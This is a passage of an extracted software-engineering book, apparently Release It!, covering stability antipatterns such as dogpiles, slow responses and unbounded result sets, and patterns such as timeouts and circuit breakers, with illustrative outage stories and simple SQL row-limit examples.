      "extraction_method": "Unstructured"
    },
    {
      "page_number": 89,
      "content": "Unbalanced Capacities • 77\n\nDrive Out Through Testing\n\nUnbalanced capacities are another problem rarely observed during QA. The main reason is that QA for every system is usually scaled down to just two servers. So during integration testing, two servers represent the front-end system and two servers represent the back-end system, resulting in a one- to-one ratio. In production, where the big budget gets allocated, the ratio could be ten to one or worse.\n\nShould you make QA an exact scale replica of the entire enterprise? It would be nice, wouldn’t it? Of course, you can’t do that. You can apply a test harness, though. (See Test Harnesses, on page 113.) By mimicking a back-end system wilting under load, the test harness helps you verify that your front-end system degrades gracefully. (See Handle Others' Versions, on page 270, for more ideas for testing.)\n\nOn the flip side, if you provide a service, you probably expect a “normal” workload. That is, you reasonably expect that today’s distribution of demand and transaction types will closely match yesterday’s workload. If all else remains unchanged, then that’s a reasonable assumption. Many factors can change the workload coming at your system, though: marketing campaigns, publicity, new code releases in the front-end systems, and especially links on social media and link aggregators. As a service provider, you’re even further removed from the marketers who would deliberately cause these traffic changes. Surges in publicity are even less predictable.\n\nSo, what can you do if your service serves such unpredictable callers? Be ready for anything. First, use capacity modeling to make sure you’re at least in the ballpark. Three thousand threads calling into seventy-five threads is not in the ballpark. Second, don’t just test your system with your usual workloads. See what happens if you take the number of calls the front end could possibly make, double it, and direct it all against your most expensive transaction. If your system is resilient, it might slow down—even start to fail fast if it can’t process transactions within the allowed time (see Fail Fast, on page 106)—but it should recover once the load goes down. Crashing, hung threads, empty responses, or nonsense replies indicate your system won’t survive and might just start a cascading failure. Third, if you can, use autoscaling to react to surging demand. It’s not a panacea, since it suffers from lag and can just pass the problem down the line to an overloaded plat- form service. Also, be sure to impose some kind of financial constraint on your autoscaling as a risk management measure.\n\nreport erratum • discuss",
      "content_length": 2657,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 90,
      "content": "Chapter 4. Stability Antipatterns • 78\n\nRemember This\n\nExamine server and thread counts.\n\nIn development and QA, your system probably looks like one or two servers, and so do all the QA versions of the other systems you call. In production, the ratio might be more like ten to one instead of one to one. Check the ratio of front-end to back-end servers, along with the number of threads each side can handle in production compared to QA.\n\nObserve near Scaling Effects and users.\n\nUnbalanced Capacities is a special case of Scaling Effects: one side of a relationship scales up much more than the other side. A change in traffic patterns—seasonal, market-driven, or publicity-driven—can cause a usually benign front-end system to suddenly flood a back-end system, in much the same way as a hot Reddit post or celebrity tweet causes traffic to suddenly flood websites.\n\nVirtualize QA and scale it up.\n\nEven if your production environment is a fixed size, don’t let your QA languish at a measly pair of servers. Scale it up. Try test cases where you scale the caller and provider to different ratios. You should be able to automate this all through your data center automation tools.\n\nStress both sides of the interface.\n\nIf you provide the back-end system, see what happens if it suddenly gets ten times the highest-ever demand, hitting the most expensive transaction. Does it fail completely? Does it slow down and recover? If you provide the front-end system, see what happens if calls to the back end stop responding or get very slow.\n\nDogpile\n\nA large-scale power outage acts a lot like a software failure. It starts with a small event, like a power line grounding out on a tree. Ordinarily that would be no big deal, but under high-stress conditions it can turn into a cascading failure that affects millions of people. We can learn from how power gets restored after an outage. Operators must perform a tricky balancing act between generation, transmission, and demand.\n\nThere used to be a common situation where power would be restored and then cut off again in a matter of seconds. The surge of current demand from millions of air conditioners and refrigerators would overload the newly restored supply. It was especially common in large metro areas during heat waves.\n\nreport erratum • discuss",
      "content_length": 2300,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 91,
      "content": "Dogpile • 79\n\nThe increased current load would hit just when supply was low, causing excess demand to trip circuit breakers. Lights out, again.\n\nSmarter appliances and more modern control systems have mitigated that particular failure mode now, but there are still useful lessons for us. For one thing, only the fully assembled system—motors, transmission lines, circuit breakers, generators, and control systems—exhibits that behavior. No smaller subset of components can produce the same outcome. Troubling when you think about QA environments, isn’t it?\n\nAnother lesson is that the steady-state load on a system might be significantly different than the startup or periodic load. Imagine a farm of app servers booting up. Every single one needs to connect to a database and load some amount of reference or seed data. Every one starts with a cold cache and only gradually gets to a useful working set. Until then, most HTTP requests translate into one or more database queries. That means the transient load on the database is much higher when applications start up than after they’ve been running for a while.\n\nColo Workaround\n\nCraig Andera, developer at Adzerk, relates this story:\n\nI once worked in the IT department of a company in the housing market. I was on the same team as the guys that maintained the servers and was often in and out of the server room, occasionally helping with maintenance tasks. As the server room acquired more and more hardware, we ran into a problem one day when the breaker tripped. When it was reset, all of the computers started up, pulling hard on current. Breaker trips again. There were two fixes for this:\n\n1. Bring the machines up one at a time.\n\n2.\n\nJam a screwdriver into the breaker handle so it wouldn’t trip again.\n\nNumber 2 necessitated clamping a fan in place to keep the stressed breaker from overheating.\n\nWhen a bunch of servers impose this transient load all at once, it’s called a dogpile. (“Dogpile” is a term from American football in which the ball-carrier gets compressed at the base of a giant pyramid of steroid-infused flesh.)\n\nA dogpile can occur in several different situations:\n\nWhen booting up several servers, such as after a code upgrade and restart • When a cron job triggers at midnight (or on the hour for any hour, really) • When the configuration management system pushes out a change\n\nreport erratum • discuss",
      "content_length": 2384,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 92,
      "content": "Chapter 4. Stability Antipatterns • 80\n\nSome configuration management tools allow you to configure a randomized “slew” that will cause servers to pull changes at slightly different times, dis- persing the dogpile across several seconds.\n\nDogpiles can also occur when some external phenomenon causes a synchro- nized “pulse” of traffic. Imagine a city street with walk/don’t walk signs on every corner. When people are allowed to cross a street, they’ll move in a clump. People walk at different speeds so they’ll disperse to some degree, but the next stoplight will resynchronize them into a clump again. Look out for any place where many threads can get blocked waiting for one thread to complete. When the logjam breaks, the newly freed threads will dogpile any other downstream system.\n\nA pulse can develop during load tests, if the virtual user scripts have fixed- time waits in them. Instead, every pause in a script should have a small random delta applied.\n\nRemember This\n\nDogpiles force you to spend too much to handle peak demand.\n\nA dogpile concentrates demand. It requires a higher peak capacity than you’d need if you spread the surge out.\n\nUse random clock slew to diffuse the demand.\n\nDon’t set all your cron jobs for midnight or any other on-the-hour time. Mix them up to spread the load out.\n\nUse increasing backoff times to avoid pulsing.\n\nA fixed retry interval will concentrate demand from callers on that period. Instead, use a backoff algorithm so different callers will be at different points in their backoff periods.\n\nForce Multiplier\n\nLike a lever, automation allows administrators to make large movements with less effort. It’s a force multiplier.\n\nOutage Amplification\n\nOn August 11, 2016, link aggregator Reddit.com suffered an outage. It was unavailable for approximately ninety minutes and had degraded service for about another ninety minutes.8 In their postmortem, Reddit admins described a conflict between deliberate, manual changes and their automation platform:\n\n8.\n\nwww.reddit.com/r/announcements/comments/4y0m56/why_reddit_was_down_on_aug_11\n\nreport erratum • discuss",
      "content_length": 2105,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 93,
      "content": "Force Multiplier • 81\n\n1. First, the admins shut down their autoscaler service so that they could upgrade a ZooKeeper cluster.9\n\n2. Sometime into the upgrade process, the package management system\n\ndetected the autoscaler was off and restarted it.\n\n3. The autoscaler came back online and read the partially migrated ZooKeeper data. The incomplete ZooKeeper data reflected a much smaller environment than was currently running.\n\n4. The autoscaler decided that too many servers were running. It therefore shut down many application and cache servers. This is the start of the downtime.\n\n5. Sometime later, the admins identified the autoscaler as the culprit. They overrode the autoscaler and started restoring instances manually. The instances came up, but their caches were empty. They all made requests to the database at the same time, which led to a dogpile on the database. Reddit was up but unusably slow during this time.\n\n6. Finally, the caches warmed sufficiently to handle typical traffic. The long nightmare ended and users resumed downvoting everything they disagree with. In other words, normal activity resumed. The most interesting aspect of this outage is the way it emerged from a conflict between the automation platform’s “belief” about the expected state of the system and the administrator’s belief about the expected state. When the package management system reactivated the autoscaler, it had no way to know that the autoscaler was expected to be down. Likewise, the autoscaler had no way to know that its source of truth (ZooKeeper) was temporarily unable to report the truth. Like HAL 9000, the automation systems were stuck between two conflicting sets of instructions.\n\nA similar condition can occur with service discovery systems. A service dis- covery service is a distributed system that attempts to report on the state of many distributed systems to other distributed systems. When things are running normally, they work as shown in the figure on page 82.\n\nThe nodes of the discovery system gossip among themselves to synchronize their knowledge of the registered services. They run health checks periodically to see if any of the services’ nodes should be taken out of rotation. If a single instance of one of the services stops responding, then the discovery service removes that node’s IP address. No wonder they can amplify a failure. One\n\n9.\n\nhttp://zookeeper.apache.org\n\nreport erratum • discuss",
      "content_length": 2430,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 94,
      "content": "Chapter 4. Stability Antipatterns • 82\n\nLoad Balancer\n\nDiscoveryServiceNode 1\n\nApplications\n\nDiscoveryServiceNode 2\n\nDiscoveryServiceNode 3\n\nservice Amany nodes\n\nservice Bmany nodes\n\nservice Cmany nodes\n\nservice Dmany nodes\n\nhealth checks\n\n“all services OK”“all services OK”\n\nespecially challenging failure mode occurs when a service discovery node is itself partitioned away from the rest of the network. As shown in the next figure, node 3 of the discovery service can no longer reach any of the managed services. Node 3 kind of panics. It can’t tell the difference between “the rest of the universe just disappeared” and “I’ve got a blindfold on.” But if node 3 can still gossip with nodes 1 and 2, then it can propagate its belief to the whole cluster. All at once, service discovery reports that zero services are available. Any application that needs a service gets told, “Sorry, but it looks like a meteor hit the data center. It’s a smoking crater.”\n\nhealth checks\n\nLoad Balancer\n\nDiscoveryServiceNode 1\n\nApplications\n\nDiscoveryServiceNode 2\n\nDiscoveryServiceNode 3\n\nservice Amany nodes\n\nservice Bmany nodes\n\nservice Cmany nodes\n\nservice Dmany nodes\n\n“Node 3 says ‘Everything crashed!’”“Everything crashed!”\n\nXnetwork partitionedall health checks fail\n\nreport erratum • discuss",
      "content_length": 1285,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 95,
      "content": "Force Multiplier • 83\n\nConsider a similar failure, but with a platform management service instead. This service is responsible for starting and stopping machine instances. If it forms a belief that everything is down, then it would necessarily start a new copy of every single service required to run the enterprise.\n\nThis situation arises mostly with “control plane” software. The “control plane” refers to software that exists to help manage the infrastructure and applica- tions rather than directly delivering user functionality. Logging, monitoring, schedulers, scalers, load balancers, and configuration management are all parts of the control plane.\n\nThe common thread running through these failures is that the automation is not being used to simply enact the will of a human administrator. Rather, it’s more like industrial robotics: the control plane senses the current state of the system, compares it to the desired state, and effects changes to bring the current state into the desired state.\n\nIn the Reddit failure, ZooKeeper held a representation of the desired state. That representation was (temporarily) incorrect.\n\nIn the case of the discovery service, the partitioned node was not able to cor- rectly sense the current state.\n\nA failure can also result when the “desired” state is computed incorrectly and may be impossible or impractical. For example, a naive scheduler might try to run enough instances to drain a queue in a fixed amount of time. Depending on the individual jobs’ processing time, the number of instances might be “infinity.” That will smart when the Amazon Web Services bill arrives!\n\nControls and Safeguards\n\nThe United States has a government agency called the Occupational Safety and Health Administration (OSHA). We don’t see them too often in the software field, but we can still learn from their safety advice for robots.10\n\nIndustrial robots have multiple layers of safeguards to prevent damage to people, machines, and facilities. In particular, limiting devices and sensors detect when the robot is not operating in a “normal” condition. For example, suppose a robot arm has a rotating joint. There are limits on how far the arm is allowed to rotate based on the expected operating envelope. These will be much, much smaller than the full range of motion the arm could reach. The rate of rotation will be limited so it doesn’t go flinging car doors across an assembly plant if the grip fails. Some joints even detect if they are not working\n\n10. www.osha.gov/dts/osta/otm/otm_iv/otm_iv_4.html#5\n\nreport erratum • discuss",
      "content_length": 2569,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 96,
      "content": "Chapter 4. Stability Antipatterns • 84\n\nagainst the expected amount of weight or resistance (as might happen when the front falls off).\n\nWe can implement similar safeguards in our control plane software:\n\nIf observations report that more than 80 percent of the system is unavailable,\n\nit’s more likely to be a problem with the observer than the system.\n\nApply hysteresis. (See Governor, on page 123.) Start machines quickly, but shut them down slowly. Starting new machines is safer than shutting old ones off.\n\nWhen the gap between expected state and observed state is large, signal for confirmation. This is equivalent to a big yellow rotating warning lamp on an industrial robot.\n\nSystems that consume resources should be stateful enough to detect if\n\nthey’re trying to spin up infinity instances.\n\nBuild in deceleration zones to account for momentum. Suppose your control plane senses excess load every second, but it takes five minutes to start a virtual machine to handle the load. It must make sure not to start 300 virtual machines because the high load persists.\n\nRemember This\n\nAsk for help before causing havoc.\n\nInfrastructure management tools can make very large impacts very quickly. Build limiters and safeguards into them so they won’t destroy your whole system at once.\n\nBeware of lag time and momentum.\n\nActions initiated by automation take time. That time is usually longer than a monitoring interval, so make sure to account for some delay in the system’s response to the action.\n\nBeware of illusions and superstitions.\n\nControl systems sense the environment, but they can be fooled. They compute an expected state and a “belief” about the current state. Either can be mistaken.\n\nSlow Responses\n\nAs you saw in Socket-Based Protocols, on page 35, generating a slow response is worse than refusing a connection or returning an error, particularly in the context of middle-layer services.\n\nreport erratum • discuss",
      "content_length": 1931,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 97,
      "content": "Slow Responses • 85\n\nA quick failure allows the calling system to finish processing the transaction rapidly. Whether that is ultimately a success or a failure depends on the application logic. A slow response, on the other hand, ties up resources in the calling system and the called system.\n\nSlow responses usually result from excessive demand. When all available request handlers are already working, there’s no slack to accept new requests. Slow responses can also happen as a symptom of some underlying problem. Memory leaks often manifest via Slow Responses as the virtual machine works harder and harder to reclaim enough space to process a transaction. This will appear as a high CPU utilization, but it is all due to garbage collection, not work on the transactions themselves. I have occasionally seen Slow Responses resulting from network congestion. This is relatively rare inside a LAN but can definitely happen across a WAN—especially if the protocol is too chatty. More frequently, however, I see applications letting their sockets’ send buffers getting drained and their receive buffers filling up, causing a TCP stall. This usually happens in a hand-rolled, low-level socket protocol, in which the read() routine does not loop until the receive buffer is drained.\n\nSlow responses tend to propagate upward from layer to layer in a gradual form of cascading failure.\n\nYou should give your system the ability to monitor its own performance, so it can also tell when it isn’t meeting its service-level agreement. Suppose your system is a service provider that’s required to respond within one hundred milliseconds. When a moving average over the last twenty transactions exceeds one hundred milliseconds, your system could start refusing requests. This could be at the application layer, in which the system would return an error response within the defined protocol. Or it could be at the connection layer, by refusing new socket connections. Of course, any such refusal to provide service must be well documented and expected by the callers. (Since the developers of that system will surely have read this book, they’ll already be prepared for failures, and their system will handle them gracefully.)\n\nRemember This\n\nSlow Responses trigger Cascading Failures.\n\nUpstream systems experiencing Slow Responses will themselves slow down and might be vulnerable to stability problems when the response times exceed their own timeouts.\n\nreport erratum • discuss",
      "content_length": 2468,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 98,
      "content": "Chapter 4. Stability Antipatterns • 86\n\nFor websites, Slow Responses cause more traffic.\n\nUsers waiting for pages frequently hit the Reload button, generating even more traffic to your already overloaded system.\n\nConsider Fail Fast.\n\nIf your system tracks its own responsiveness, then it can tell when it’s getting slow. Consider sending an immediate error response when the average response time exceeds the system’s allowed time (or at the very least, when the average response time exceeds the caller’s timeout!).\n\nHunt for memory leaks or resource contention.\n\nContention for an inadequate supply of database connections produces Slow Responses. Slow Responses also aggravate that contention, leading to a self-reinforcing cycle. Memory leaks cause excessive effort in the garbage collector, resulting in Slow Responses. Inefficient low-level proto- cols can cause network stalls, also resulting in Slow Responses.\n\nUnbounded Result Sets\n\nDesign with skepticism, and you will achieve resilience. Ask, “What can system X do to hurt me?” and then design a way to dodge whatever wrench your supposed ally throws.\n\nIf your application is like most, it probably treats its database server with far too much trust. I’m going to try to convince you that a healthy dose of skep- ticism will help your application dodge a bullet or two.\n\nA common structure in the code goes like this: send a query to the database and then loop over the result set, processing each row. Often, processing a row means adding a new data object to a collection. What happens when the database suddenly returns five million rows instead of the usual hundred or so? Unless your application explicitly limits the number of results it’s willing to process, it can end up exhausting its memory or spinning in a while loop long after the user loses interest.\n\nBlack Monday\n\nHave you ever had a surprising discovery about an old friend? You know, like the most boring guy in the office suddenly tells you he’s into BASE jumping? That happened to me about my favorite commerce server. One day, with no warning, every instance in the farm—more than a hundred individual, load- balanced instances—started behaving badly. It seemed almost random. An instance would be fine, but then a few minutes later it would start using 100 percent of the CPU. Three or four minutes later, it would crash with a HotSpot\n\nreport erratum • discuss",
      "content_length": 2396,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 99,
      "content": "Unbounded Result Sets • 87\n\nmemory error. The operations team was restarting them as fast as they could, but it took a few minutes to start up and preload cache. Sometimes, they would start crashing before they were even finished starting. We could not keep more than 25 percent of our capacity up and running.\n\nImagine (or recall, if you’ve been there) trying to debug a totally novel failure mode while also participating in a 5 a.m. (with no coffee) conference call with about twenty people. Some of them are reporting the current status, some are trying to devise a short-term response to restore service, others are digging into root cause, and some of them are just spreading disinformation.\n\nWe sent a system admin and a network engineer to go looking for denial-of- service attacks. Our DBA reported that the database was healthy but under heavy load. That made sense, because at startup, each instance would issue hundreds of queries to warm up its caches before accepting requests. Some of the instances would crash before they started accepting requests, which told me it was not related to incoming requests. The high CPU condition looked like garbage collection to me, so I told the team I would start looking for memory problems. Sure enough, when I watched the “heap available” on one instance, I saw it heading toward zero. Shortly after it hit zero, the JVM got a HotSpot error.\n\nUsually, when a JVM runs out of memory, it throws an OutOfMemoryError. It crashes only if it is executing some native code that doesn’t check for NULL after calling malloc(). The only native code I knew of was in the type 2 JDBC driver. (For those of you who haven’t delved the esoterica of Java programming, native code means fully compiled instructions for the host processor. Typically, this is C or C++ code in dynamically linked libraries. Calling into native code makes the JVM just as crashy as any C program.) Type 2 drivers use a thin layer of Java to call out to the database vendor’s native API library. Sure enough, dumping the stack showed execution deep inside the database driver.\n\nBut what was the server doing with the database? For that, I asked our DBA to trace queries from the application servers. Soon enough, we had another instance crash, so we could see what a doomed server did before it went into the twilight zone. The queries all looked totally innocuous, though. Routine stuff. I didn’t see any of the hand-coded SQL monsters that I’d seen elsewhere (eight-way unions with five joins in each subquery, and so on). The last query I saw was just hitting a message table that the server used for its database- backed implementation of JMS. The instances mainly used it to tell each other when to flush their caches. This table should never have more than 1,000 rows, but our DBA saw that it topped the list of most expensive queries.\n\nreport erratum • discuss",
      "content_length": 2883,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 100,
      "content": "Chapter 4. Stability Antipatterns • 88\n\nFor some reason, that usually tiny table had more than ten million rows. Because the app server was written to just select all the rows from the table, each instance would try to receive all ten-million-plus messages. This put a lock on the rows, since the app server issued a “select for update” query. As it tried to make objects out of the messages, it would use up all available memory, eventually crashing. Once the app server crashed, the database would roll back the transaction, releasing the lock. Then the next app server would step off the cliff by querying the table. We did an extraordinary amount of hand-holding and manual work to compensate for the lack of a LIMIT clause on the app server’s query. By the time we had stabilized the system, Black Monday was done…it was Tuesday.\n\nWe did eventually find out why the table had more than ten million messages in it, but that’s a different story.\n\nThis failure mode can occur when querying databases or calling services. It can also occur when front-end applications call APIs. Because datasets in development tend to be small, the application developers may never experience negative outcomes. After a system is in production for a year, however, even a traversal such as “fetch customer’s orders” can return huge result sets. When that happens, you are treating your best, most loyal customers to the very worst performance!\n\nIn the abstract, an unbounded result set occurs when the caller allows the other system to dictate terms. It’s a failure in handshaking. In any API or pro- tocol, the caller should always indicate how much of a response it’s prepared to accept. TCP does this in the “window” header field. Search engine APIs allow the caller to specify how many results to return and what the starting offset should be. There’s no standard SQL syntax to specify result set limits. ORMs support query parameters that can limit results returned from a query but do not usually limit results when following an association (such as container to contents). Therefore, beware of any relationship that can accumulate unlimited children, such as orders to order lines or user profiles to site visits. Entities that keep an audit trail of changes are also suspect.\n\nBeware of the way that patterns of relationships can change from QA to pro- duction as well. Early social media sites assumed that the number of connec- tions per user would be distributed on something like a bell curve. In fact it’s a power law distribution, which behaves totally differently. If you test with bell-curve distributed relationships, you would never expect to load an entity that has a million times more relationships than the average. But that’s guaranteed to happen with a power law.\n\nreport erratum • discuss",
      "content_length": 2798,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 101,
      "content": "Unbounded Result Sets • 89\n\nIf you’re handcrafting your own SQL, use one of these recipes to limit the number of rows to fetch:\n\n-- Microsoft SQL Server SELECT TOP 15 colspec FROM tablespec\n\n-- Oracle (since 8i) SELECT colspec FROM tablespec WHERE rownum <= 15\n\n-- MySQL and PostgreSQL SELECT colspec FROM tablespec LIMIT 15\n\nAn incomplete solution (but better than nothing) would be to query for the full results but break out of the processing loop after reaching the maximum number of rows. Although this does provide some added stability on the application server, it does so at the expense of wasted database capacity.\n\nUnbounded result sets are a common cause of slow responses. They can result from violation of steady state (see Steady State, on page 101).\n\nRemember This\n\nUse realistic data volumes.\n\nTypical development and test data sets are too small to exhibit this problem. You need production-sized data sets to see what happens when your query returns a million rows that you turn into objects. As a side benefit, you’ll also get better information from your performance testing when you use production-sized test data.\n\nPaginate at the front end.\n\nBuild pagination details into your service call. The request should include a parameter for the first item and the count. The reply should indicate (roughly) how many results there are.\n\nDon’t rely on the data producers.\n\nEven if you think a query will never have more than a handful of results, beware: it could change without warning because of some other part of the system. The only sensible numbers are “zero,” “one,” and “lots,” so unless your query selects exactly one row, it has the potential to return too many. Don’t rely on the data producers to create a limited amount of data. Sooner or later, they’ll go berserk and fill up a table for no reason, and then where will you be?\n\nreport erratum • discuss",
      "content_length": 1880,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 102,
      "content": "Chapter 4. Stability Antipatterns • 90\n\nPut limits into other application-level protocols.\n\nService calls, RMI, DCOM, XML-RPC, and any other kind of request/reply call are vulnerable to returning huge collections of objects, thereby con- suming too much memory.\n\nWrapping Up\n\nWe’ve covered a lot of dark territory in this chapter. We’ve looked at many different ways your systems are under threat, both internally and externally. These antipatterns are found in nearly every service and application. Good news! It’s time to emerge from this vale of shadows into the light. It’s time to talk about the stability patterns you can apply to protect your software.\n\nreport erratum • discuss",
      "content_length": 685,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 103,
      "content": "CHAPTER 5\n\nStability Patterns\n\nWe have traveled through the vale of shadows. Now it is time to come in to the light. In the last chapter, we saw the antipatterns to avoid. In this chapter, we’ll look at the flip side and examine some patterns that are the inverse of the killers from the last chapter. These healthy patterns provide the architec- ture and design guidance to reduce, eliminate, or mitigate the effects of cracks in the system. Not one of these will help your software pass QA, but they will help you get a full night’s sleep, or at least an uninterrupted dinner with your family, once your software launches.\n\nDon’t make the mistake of assuming that a system that includes more of these patterns is superior to one with fewer of them. “Count of patterns applied” is never a good quality metric. Instead, I want you to develop a recovery-oriented mind-set. At the risk of sounding like a broken record, I’ll say it again: expect failures. Apply these patterns wisely to reduce the damage done by an individual failure.\n\nTimeouts\n\nIn the early days, networking issues affected only programmers working on low-level software: operating systems, network protocols, remote filesystems, and so on. Today, every system is a distributed system. Every application must grapple with the fundamental nature of networks: networks are fallible. The wire could be broken, some switch or router along the way could be broken, or the computer you are addressing could be broken. Your thermostat can’t talk to your TV because the microwave is on. Even if you’ve already established communication, any of these elements could break at any time. When that happens, your code can’t just wait forever for a response that might never come; sooner or later, it needs to give up. Hope is not a design method.\n\nreport erratum • discuss",
      "content_length": 1826,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 104,
      "content": "Chapter 5. Stability Patterns • 92\n\nThe timeout is a simple mechanism allowing you to stop waiting for an answer once you think it won’t come. I once had a project to port the BSD sockets library to a mainframe-based UNIX environment. I attacked the project with a stack of RFCs and a dusty pile of source code for UNIX System V Release 4. Two issues nagged at me throughout the entire project. First, heavy use of “#ifdef” blocks for different architectures made it look less like a portable operating system than twenty different operating systems intermingled. Sec- ond, the networking code was absolutely riddled with error handling for dif- ferent flavors of timeouts. By the project’s end, I had grown to understand and appreciate the significance of timeouts.\n\nWell-placed timeouts provide fault isolation—a problem in some other service or device does not have to become your problem. Unfortunately, at higher levels of abstraction, further from the dirty world of hardware, good placement of timeouts becomes increasingly rare. Indeed, some high-level APIs have few or no explicit timeout settings. Presumably the designers behind these APIs have never been awakened in the wee hours to recover a crashed system. Many APIs offer both a call with a timeout and a simpler, easier call that blocks forever. It would be better if, instead of overloading a single function, the no-timeout version were labeled “CheckoutAndMaybeKillMySystem.”\n\nCommercial software client libraries are notoriously devoid of timeouts. These libraries often do direct socket calls on behalf of the system. By hiding the socket from your code, they also prevent you from setting vital timeouts.\n\nTimeouts can also be relevant within a single service. Any resource pool can be exhausted. Conventional usage dictates that the calling thread should be blocked until one of the resources is checked in. (See Blocked Threads, on page 62.)\n\nIt’s essential that any resource pool that blocks threads must have a timeout to ensure that calling threads eventually unblock, whether resources become available or not.\n\nAlso beware of language-level synchronization or mutexes. Always use the form that takes a timeout argument.\n\nAn approach to dealing with pervasive timeouts is to organize long-running operations into a set of primitives that you can reuse in many places. For example, suppose you need to check out a database connection from a resource pool, run a query, turn the result set into objects, and then check the database connection back into the pool. At least three points in that interaction could hang indefinitely. Instead of coding that sequence of interactions dozens of places, with all the associated handling of timeouts (not to mention other kinds\n\nreport erratum • discuss",
      "content_length": 2771,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 105,
      "content": "Timeouts • 93\n\nIs All This Clutter Really Necessary?\n\nYou may think, as I did when porting the sockets library, that handling all the possible timeouts creates undue complexity in your code. It certainly adds complexity. You may find that half your code is devoted to error handling instead of providing features. I argue, however, that the essence of aiming for production—instead of aiming for QA—is handling the slings and arrows of outrageous fortune. That error-handling code, if done well, adds resilience. Your users may not thank you for it, because nobody notices when a system doesn’t go down, but you will sleep better at night.\n\nof errors), create a query object (see Patterns of Enterprise Application Architecture [Fow03]) to represent the part of the interaction that changes.\n\nUse a generic gateway to provide the template for connection handling, error handling, query execution, and result processing. That way you only need to get it right in one place, and calling code can provide just the essential logic. Collecting this common interaction pattern into a single class also makes it easier to apply the Circuit Breaker pattern.\n\nMake full use of your platform. Infrastructure services like Amazon API Gateway can handle a lot of the dirty details for you. Language runtimes that use callbacks or reactive programming styles also let you specify timeouts more easily.\n\nTimeouts are often found in the company of retries. Under the philosophy of “best effort,” the software attempts to repeat an operation that timed out. Immediately retrying an operation after a failure has a number of conse- quences, but only some of them are beneficial. If the operation failed because of any significant problem, it’s likely to fail again if retried immediately. Some kinds of transient failures might be overcome with a retry (for example, dropped packets over a WAN). Within the walls of a data center, however, the failure is probably because of something wrong with the other end of a connection. My experience has been that problems on the network, or with other servers, tend to last for a while. Thus, fast retries are very likely to fail again.\n\nFrom the client’s perspective, making me wait longer is a very bad thing. If you cannot complete an operation because of some timeout, it is better for you to return a result. It can be a failure, a success, or a note that you’ve queued the work for later execution (if I should care about the distinction). In any case, just come back with an answer. Making me wait while you retry the operation might push your response time past my timeout. It certainly keeps my resources busy longer than needed.\n\nreport erratum • discuss",
      "content_length": 2689,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 106,
      "content": "Chapter 5. Stability Patterns • 94\n\nOn the other hand, queuing the work for a slow retry later is a good thing, making the system more robust. Imagine if every mail server between the sender and receiver had to be online, ready to process your mail, and had to respond within sixty seconds in order for email to make it through. How well would the global email system scale? The store-and-forward approach obvi- ously makes much more sense. In the case of failure in a remote server, queue-and-retry ensures that once the remote server is healthy again, the overall system will recover. Work does not need to be lost completely just because part of the larger system isn’t functioning. How fast is fast enough? It depends on your application and your users. For a service behind a web API, “fast enough” is probably between 10 and 100 milliseconds. Beyond that, you’ll start to lose capacity and customers.\n\nTimeouts have natural synergy with circuit breakers. A circuit breaker can tabulate timeouts, tripping to the “off” state if too many occur.\n\nThe Timeouts pattern and the Fail Fast pattern (which I discus in Fail Fast, on page 106) both address latency problems. The Timeouts pattern is useful when you need to protect your system from someone else’s failure. Fail Fast is useful when you need to report why you won’t be able to process some transaction. Fail Fast applies to incoming requests, whereas the Timeouts pattern applies primarily to outbound requests. They’re two sides of the same coin.\n\nTimeouts can also help with unbounded result sets by preventing the client from processing the entire result set, but they aren’t the most effective approach to that particular problem. They’d be a stopgap, but not much more than that.\n\nTimeouts apply to a general class of problems. As such, they help systems recover from unanticipated events.\n\nRemember This\n\nApply Timeouts to Integration Points, Blocked Threads, and Slow Responses. The Timeouts pattern prevents calls to Integration Points from becoming Blocked Threads. Thus, timeouts avert Cascading Failures.\n\nApply Timeouts to recover from unexpected failures.\n\nWhen an operation is taking too long, sometimes we don’t care why…we just need to give up and keep moving. The Timeouts pattern lets us do that.\n\nConsider delayed retries.\n\nMost of the explanations for a timeout involve problems in the network or the remote system that won’t be resolved right away. Immediate retries\n\nreport erratum • discuss",
      "content_length": 2473,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 107,
      "content": "Circuit Breaker • 95\n\nare liable to hit the same problem and result in another timeout. That just makes the user wait even longer for her error message. Most of the time, you should queue the operation and retry it later.\n\nCircuit Breaker\n\nNot too long ago, when electrical wiring was first being built into houses, many people fell victim to physics. The unfortunates would plug too many appliances into their circuit. Each appliance drew a certain amount of cur- rent. When current is resisted, it produces heat proportional to the square ). Because houses lacked supercon- of the current times the resistance ( ducting home wiring, this hidden coupling between electronic gizmos made the wires in the walls get hot, sometimes hot enough to catch fire. Whoosh. No more house.\n\nI2R\n\nThe fledgling energy industry found a partial solution to the problem of resistive heating in the form of fuses. The entire purpose of an electrical fuse is to burn up before the house does. It’s a component designed to fail first, thereby controlling the overall failure mode. This brilliant device worked well, except for two flaws. First, a fuse is a disposable, one-time use item; therefore, it’s possible to run out of them. Second, residential fuses (in the United States) were about the same diameter as copper pennies. Together, these two flaws led many people to conduct experiments with homemade, high-current, low-resistance fuses (that is, a 3/4-inch disk of copper). Whoosh. No more house.\n\nResidential fuses have gone the way of the rotary dial telephone. Now, circuit breakers protect overeager gadget hounds from burning their houses down. The principle is the same: detect excess usage, fail first, and open the circuit. More abstractly, the circuit breaker exists to allow one subsystem (an electrical circuit) to fail (excessive current draw, possibly from a short circuit) without destroying the entire system (the house). Furthermore, once the danger has passed, the circuit breaker can be reset to restore full function to the system.\n\nYou can apply the same technique to software by wrapping dangerous opera- tions with a component that can circumvent calls when the system is not healthy. This differs from retries, in that circuit breakers exist to prevent operations rather than reexecute them.\n\nIn the normal “closed” state, the circuit breaker executes operations as usual. These can be calls out to another system, or they can be internal operations that are subject to timeout or other execution failure. If the call succeeds, nothing extraordinary happens. If it fails, however, the circuit breaker makes\n\nreport erratum • discuss",
      "content_length": 2645,
